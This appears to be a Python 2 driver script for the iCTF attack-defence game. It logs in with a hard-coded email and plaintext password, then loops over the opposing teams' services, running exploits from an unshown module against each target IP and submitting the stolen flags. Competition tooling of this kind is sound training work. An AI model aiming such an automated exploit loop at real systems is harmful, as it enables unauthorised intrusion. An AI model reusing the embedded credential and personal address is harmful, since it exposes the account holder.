from exploit_scripts import *

from ictf.client import Team
from ictf.client import iCTF
import time
import pdb
import sys
password = "2T47WGXNbhRMWwkz"
email = "thomas.sigler.15@ucl.ac.uk"

ctf = iCTF()
#Gets the team method
team = ctf.login(email, password)

#Gets a list of all services in the game
all_services = team.get_service_list()
if(len(sys.argv) > 1) :
	for service in all_services: 
		if service['port'] == int(sys.argv[1]):
			all_services = [service]


flags = list()
for service in all_services:
	#List of all targets with a specific service
	print "At service: ", str(service['service_name'])
	targets_with_service = team.get_targets(str(service['service_name']))

	targets = targets_with_service["targets"]

	service_exploit = get_exploit(service) 
	#If the exploit exists then for Loop
	if(service_exploit):
		for target in targets:
			print "      @target", target
			flag_id = str(target["flag_id"])
			ip      = str(target["ip_address"])

			try:
				flag = service_exploit.exploit(ip, service_exploit.get_port() , flag_id)
				flags.append(flag)
				print "Flag recieved:",flag
				team.submit_flag([flag])
			except Exception:
				print "@target: ",target
			

flag_results = team.submit_flag(flags)

pdb.set_trace()






